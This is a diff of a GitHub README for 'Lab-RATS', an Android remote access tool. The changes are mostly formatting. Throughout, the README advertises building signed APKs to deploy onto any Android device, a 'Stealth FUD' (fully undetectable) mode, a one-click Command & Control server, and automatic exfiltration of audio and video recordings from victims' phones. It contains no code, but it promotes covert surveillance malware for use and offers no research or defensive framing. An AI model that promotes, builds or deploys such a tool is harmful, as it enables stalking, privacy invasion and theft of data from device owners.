@@ -1,24 +1,19 @@
-<p align="center">
-  <a href="https://postimg.cc/nC9DNBkn">
-    <img src="https://i.postimg.cc/RVXL6TJJ/ic-launcher-playstore.png" alt="ic-launcher-playstore.png" />
-  </a>
-</p>
+[![0-Lab-RATS-Header.png](https://i.postimg.cc/Y9chdzww/0-Lab-RATS-Header.png)](https://postimg.cc/Z9cbR3Rf)
 
 <p align="center">
-  <img src="https://img.shields.io/badge/K4N3CO-LabRATS-cyan?style=for-the-badge&logo=probot&logoColor=white">
   <img src="https://img.shields.io/badge/JDK-21-gold?style=for-the-badge&logo=openjdk&logoColor=white">
-  <img src="https://img.shields.io/badge/Android-SDK_34-3DDC84?style=for-the-badge&logo=android&logoColor=white">
+  <img src="https://img.shields.io/badge/Android-SDK_34-green?style=for-the-badge&logo=android&logoColor=white">
   <img src="https://img.shields.io/badge/Focus-Remote_Access-red?style=for-the-badge&logo=airplayvideo&logoColor=white">
-  <br>
   <img src="https://img.shields.io/badge/Security-AES_256-blueviolet?style=for-the-badge&logo=dependencycheck&logoColor=white">
+  <br>
   <img src="https://img.shields.io/badge/Network-Direct_IPv6-informational?style=for-the-badge&logo=p2p&logoColor=white">
   <img src="https://img.shields.io/badge/Mode-Stealth_FUD-black?style=for-the-badge&logo=ghost&logoColor=white">
-  <img src="https://img.shields.io/badge/License-MIT-blue?style=for-the-badge&logo=opensourceinitiative&logoColor=white">
+  <img src="https://img.shields.io/badge/License-MIT-orange?style=for-the-badge&logo=opensourceinitiative&logoColor=white">
 </p>
 
 # Lab-RATS
 
-### Advanced Android Remote Administration Tool:
+## Advanced Android Remote Administration Tool:
 
 **Lab-RATS** is a **powerful** and **lightweight Remote Administration Tool for Android**. It **builds custom signed `.apk` files** for **deployment onto any Android device** and **enables remote monitoring, interaction and management** through a sleek **web interface(C2)** and **supports the newest modern Android updates/releases**.
 
@@ -26,14 +21,14 @@
 
 ## 📡 C2 Backend Infrastructure (One-Click)
 
-Deploy your own private Command & Control hub instantly to manage your fleet and preserve exfiltrated data. The backend features a **Glass-Morphism UI**, **Orbitron typography**, and a **Tactical Exfiltration Vault**.
+**Deploy your own private Command & Control hub instantly** to **manage your fleet and preserve exfiltrated data**. The backend features a **Glass-Morphism UI**, **Orbitron typography**, and a **Tactical Exfiltration Vault**.
 
 [![Deploy to Render](https://render.com/images/deploy-to-render-button.svg)](https://render.com/deploy?repo=https://github.com/K4N3CO/Lab-RATS)
 
 ### Tactical Advantages:
-- **Centralized Fleet**: Monitor battery, network, and live status of every "Rat" in one professional dashboard.
-- **Evidence Vault**: Automatically exfiltrate and store audio/video recordings directly on your server.
-- **Dynamic IP Sync**: Automatic heartbeat reporting ensures your P2P links are always up-to-date, bypassing the hassle of mobile IP changes.
+- **Centralized Fleet**: **Monitor battery, network**, and **live status** of every **"Lab-Rat"** in **one professional dashboard**.
+- **Evidence Vault**: Automatically **exfiltrate** and **store audio/video recordings** directly on your server.
+- **Dynamic IP Sync**: Automatic **heartbeat reporting** ensures your P2P links **are always up-to-date**, bypassing the hassle of mobile IP changes.
 
 ---
 
